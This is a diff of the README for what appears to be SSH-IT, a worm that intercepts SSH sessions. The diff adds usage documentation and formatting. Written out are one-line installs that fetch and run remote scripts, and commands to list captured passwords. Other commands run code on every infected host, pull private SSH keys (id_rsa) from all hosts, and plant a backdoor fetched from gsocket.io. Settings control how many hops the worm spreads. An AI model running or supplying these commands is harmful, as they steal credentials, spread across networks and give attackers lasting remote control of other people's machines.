@@ -15,7 +15,7 @@ bash -c "$(wget --no-verbose -O- ssh-it.thc.org/x)"
 {: refdef}
 
 To show all captured passwords use:
-```
+```shell
 ~/.prng/thc_ctl -r list
 ```
 {:refdef: style="text-align: center;"}
@@ -24,16 +24,17 @@ To show all captured passwords use:
 
 
 To uninstall use:
-```
+```shell
 ~/.prng/thc_ctl -r uninstall
 ```
 
 ### ALPHA TESTING
 
-This is ALPHA STAGE. DO NOT SHARE.
-If you know about this then consider yourself special. Join us on [Telegram](https://t.me/thcorg).
+This is PRE-RELEASE ALPHA STAGE for TESTING only.
 
-ALPHA DEFAULT SETTINGS:
+Verbose mode (```THC_VERBOSE=1```) is enabled by default. The worm will stop after 2 hops (```THC_DEPTH=2```).
+
+SETTINGS:
 * ```THC_VERBOSE=1``` Display a warning when *ssh* is being intercepted (in bold red).
 * ```THC_DEPTH=2``` The worm will not spread further than 2 hops away from the current host.
 * ```THC_DEBUG=1``` Display debug information.
@@ -49,19 +50,33 @@ THC_NO_CONDOME=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ```
 
 ### Tips & Tricks
+SSH-IT is controlled with ```thc_cli```.
+```
+usage: thc_cli [-hr] [command]
+    -h          This help
+    -r          Recursive (for all hosts)
+Command:
+    list       - Show passwords
+    exec <cmd> - Execute <cmd> on target [e.g. thc_cli -r exec "id; date"]
+    clean      - Clean logfiles and state information
+    disable    - Disable interception
+    uninstall  - Clean, disable and completely remove
+Example: thc_cli -r list
+```
+
 #### Remote Command Execution
 Executing a command on _all_ hosts
-```
+```shell
 ~/.prng/thc_cli -r exec 'id'
 ```
 
 Retrieve the private SSH key (```id_rsa```) from _all_ hosts:
-```
+```shell
 ~/.prng/thc_cli -r exec 'cat .ssh/id_rsa 2>/dev/null'
 ```
 
-Install a backdoor on _all_ hosts:
-```
+Install a [backdoor](https://www.gsocket.io/deploy) on _all_ hosts:
+```shell
 ~/.prng/thc_cli -r exec 'bash -c "$(curl -fsSL gsocket.io/x)"'
 ```
 
